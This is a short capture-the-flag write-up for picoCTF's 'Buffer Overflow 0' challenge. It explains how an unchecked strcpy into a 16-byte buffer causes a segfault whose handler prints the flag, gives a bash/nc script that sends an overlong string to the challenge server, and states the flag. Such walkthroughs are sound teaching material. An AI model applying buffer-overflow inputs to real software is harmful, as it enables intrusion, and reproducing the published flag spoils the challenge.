# Buffer Overflow 0

Link: https://play.picoctf.org/practice/challenge/257?originalEvent=70&page=1

This challenge is very easy. It only requires you to put in a string of characters longer than 16.

The reason for this lies in the program itself. In the sourcecode we find an interesting function:

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

This function actually prints the flag! 

A little later we find the line `signal(SIGSEGV, sigsegv_handler); // Set up signal handler`

This line handles segmentation faults (SIGSEGV).

The next function is the one we exploit, vuln.

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

When we insert a longer string than 16 (buf1 / input) and try to copy it we get a segmentation fault. This in turn calls sigsegv_handler and prints the flag.

## Solution
With script:
```bash
#!/bin/bash
echo "Any string longer than 16 characters" > message.txt
nc saturn.picoctf.net 51110 < message.txt
```
---
Manual way (recommended for this challenge as it is very easy)
```bash
nc saturn.picoctf.net 51110
input: Any string longer that 16 characters
```

Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}`
